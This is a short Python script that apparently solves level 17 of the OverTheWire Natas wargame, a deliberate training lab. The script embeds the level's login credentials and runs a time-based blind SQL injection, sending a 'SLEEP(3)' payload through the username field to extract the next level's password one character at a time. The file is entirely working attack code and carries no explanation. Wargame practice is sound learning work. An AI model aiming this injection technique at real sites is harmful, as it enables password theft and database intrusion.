from bs4 import BeautifulSoup as bs
from time import *
import urllib
import base64
import binascii
import requests
import re
from string import *
import sys

u='natas17'
p='8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
l=f'http://{u}.natas.labs.overthewire.org/'

C=ascii_lowercase+ascii_uppercase+digits
mypwd=[]
while len(mypwd)<len(p):
    for c in C:
        print(''.join(mypwd)+c)
        start=time()
        username='natas18" AND BINARY password LIKE "'+"".join(mypwd)+c+'%" AND SLEEP(3) # '
        resp=requests.post(l,auth=(u, p),data={'username':username})
        if time() - start > 3:
            mypwd+=c,
            break
print(''.join(mypwd))
